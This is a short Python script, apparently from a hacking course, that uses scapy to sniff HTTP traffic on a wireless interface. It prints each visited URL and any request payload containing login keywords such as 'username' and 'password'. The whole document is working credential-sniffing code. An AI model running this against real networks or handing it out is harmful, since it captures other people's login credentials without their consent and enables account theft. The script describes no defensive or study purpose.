#!usr/bin/env python3 

import scapy.all as scapy 
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = processed_sniffed_packet) 
    #prn = For each packet we capture it'll call another function for us

def processed_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #Checks if packet has HTTP layer
        #print(packet.show()) #Shows which part of the HTTP layer has what 
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        
        if packet.haslayer(scapy.Raw): 
            load = packet[scapy.Raw].load 
            keyword_list = ["username".encode(), "password".encode(), "pass".encode(), "login".encode(), "user".encode()]
            for keyword in keyword_list: #Iterating over the list 
                if keyword in load: #Checking if the value is in the list 
                    print(load)
                    break

sniff("wlan0")